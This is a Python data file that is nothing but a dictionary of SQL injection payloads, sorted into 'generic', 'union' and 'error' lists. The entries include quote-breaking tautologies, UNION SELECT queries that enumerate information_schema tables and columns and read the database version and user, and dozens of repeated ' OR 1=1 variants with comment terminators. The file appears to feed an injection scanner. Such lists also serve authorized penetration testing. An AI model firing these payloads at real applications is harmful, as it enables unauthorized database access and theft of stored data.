payloadsList = {
    "generic": [
        "'",
        "''",
        "`",
        "``",
        ",",
        '"',
        '""',
        "/",
        "//",
        "\\",
        "\\\\",
        ";",
        "' or \"",
        "-- or #", 
        "' OR '1",
        "' OR 1 -- -",
        '" OR "" = "',
        '" OR 1 = 1 -- -',
        "' OR '' = '",
        "'='",
        "'LIKE'",
        "'=0--+",
        "OR 1=1",
        "' OR 'x'='x",
        "' AND id IS NULL; --",
        "'''''''''''''UNION SELECT '2",
        "%00",
        "/*…*/"],

	"union": [
		"' UNION SELECT 1, 'another', 'table'--",
		"' UNION SELECT null, null, null--",
		"' UNION SELECT ALL table_name, null, null FROM information_schema.tables--",
		"' UNION SELECT null, column_name, null FROM information_schema.columns WHERE table_name='users'--",
		"' UNION SELECT null, null, version()--",
		"' UNION SELECT null, null, database()--",
		"' UNION SELECT null, null, user()--",
		"' UNION SELECT 1, @@version, 3--",
		"' UNION SELECT null, group_concat(column_name), null FROM information_schema.columns WHERE table_schema=database()--",
		"' UNION SELECT null, null, table_name FROM information_schema.tables WHERE table_schema=database()--"
	],
	"error": [
		"' OR 1=1--",
		"' OR 'a'='a'--",
		"' OR 'a'='a'/*",
		"' OR 1=1#",
		"' OR 1=1/*",
		"' OR 1=1-- -",
		"' OR '1'='1'-- -",
		"' OR '1'='1'/*",
		"' OR 1=1#",
		"' OR 1=1/*",
		"' OR 1=1; --",
		"' OR 1=1; /*",
		"' OR 1=1; #",
		"' OR 1=1; --",
		"' OR 1=1; /*",
		"' OR 1=1; #",
		"' OR 1=1; --",
		"' OR '1'='1' --",
		"' OR '1'='1' /*",
		"' OR '1'='1' #",
		"' OR '1'='1'-- -",
		"' OR '1'='1'/*",
		"' OR 1=1##",
        "' OR 'a'='a'##",  # OR condition with identical string ##
        "' OR 'a'='a'/*",  # OR condition with comment ##
        "' OR 1=1#",  # OR condition with comment ##
        "' OR 1=1/*",  # OR condition with comment ##
        "' OR 1=1## -",  # OR condition with comment ##
        "' OR '1'='1'## -",  # OR condition with identical string and comment ##
        "' OR '1'='1'/*",  # OR condition with comment ##
        "' OR 1=1#",  # OR condition with comment ##
        "' OR 1=1/*",  # OR condition with comment ##
        "' OR 1=1; ##",  # OR condition with comment and semicolon ##
        "' OR 1=1; /*",  # OR condition with comment and semicolon ##
        "' OR 1=1; #",  # OR condition with comment and semicolon ##
        "' OR 1=1; ##",  # OR condition with comment ##
        "' OR 1=1; /*",  # OR condition with comment ##
        "' OR 1=1; #",  
        "' OR 1=1; ##", 
        "' OR '1'='1' ##",  
        "' OR '1'='1' /*",  
        "' OR '1'='1' #", 
        "' OR '1'='1'## -",  
        "' OR '1'='1'/*" 
	]
}